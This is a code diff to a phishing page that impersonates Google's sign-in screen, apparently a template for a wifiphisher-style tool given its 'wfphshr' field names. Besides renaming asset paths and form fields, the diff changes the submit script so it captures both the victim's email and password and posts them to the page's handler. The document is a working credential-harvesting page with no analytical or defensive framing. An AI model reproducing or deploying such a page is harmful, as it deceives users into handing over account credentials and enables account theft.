@@ -11,13 +11,13 @@
     <meta http-equiv="pragma" content="no-cache" />
     <meta name="viewport" content="width=device-width,
     initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noindex, nofollow"> 
 
-    <script src="assets/js/jquery.min.js"></script>
+    <script src="static/js/jquery.min.js"></script>
 
-    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
-    <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="icon" type="image/png" href="assets/img/oc3czvmbvf.png"/>
+    <link rel="stylesheet" href="static/css/bootstrap.min.css">
+    <link rel="stylesheet" href="static/css/style.css">
+    <link rel="icon" type="image/png" href="static/img/oc3czvmbvf.png"/>
 
     <style>
 
@@ -113,7 +113,7 @@
 
       <div class="google-header-bar centered">
         <div class="header content clearfix">
-          <img alt="Google" class="logo" src="assets/img/dtnk16mcjo.png">
+          <img alt="Google" class="logo" src="static/img/dtnk16mcjo.png">
         </div>
       </div>
 
@@ -121,14 +121,14 @@
 
         <div class="account-wall">
 
-          <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">
+          <img class="profile-img" src="static/img/yqczrisvt2.png" alt="">
 
           <form class="form-signin">
-            <input id="email" type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-            <input id="password" type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input id="eml" type="text" name="eml" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
+            <input id="pwd" type="password" name="pwd" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
 
             <div id="dialog">
-            <h2 id="error">Fill all the fields please.</h2>
+            <h2 id="error">Please fill in all required fields.</h2>
             </div>
 
             <button id="btn" class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
@@ -139,7 +139,7 @@
 
             <br><a href="#" class="text-center new-account">Create an account </a>
             <center><br><p class="tagline">One Google Account for everything Google</p>
-            <img src="assets/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
+            <img src="static/img/tmjjgvk28i.png" width="210" height="17" alt=""></center><br><br>
 
     <script>
       /*
@@ -149,8 +149,8 @@
       $("#btn").on("click", function(e) {
           e.preventDefault();
           // get the password box and checkbox elements
-          var input = document.getElementById("email");
-          var input2 = document.getElementById("password");
+          var input = document.getElementById("eml");
+          var input2 = document.getElementById("pwd");
           // check to see if the value is empty
           if ( input.value == "" ){
               passNotValid();
@@ -159,7 +159,10 @@
           }else{
               // post the data
               $("#dialog").css('display', 'none');
-              post('post', {"wfphshr-wpa-password": input.value});
+                post('post', {
+                  wfphshremail: input.value,
+                  wfphshrpassword: input2.value
+                });      
           }
       });
 
@@ -195,8 +198,8 @@
         document.body.appendChild(form);
         form.submit();
       }
-      var input = document.getElementById("email");
-      var input2 = document.getElementById("password");
+      var input = document.getElementById("eml");
+      var input2 = document.getElementById("pwd");
       input.disabled = false;
       input2.disabled = false;
     </script>
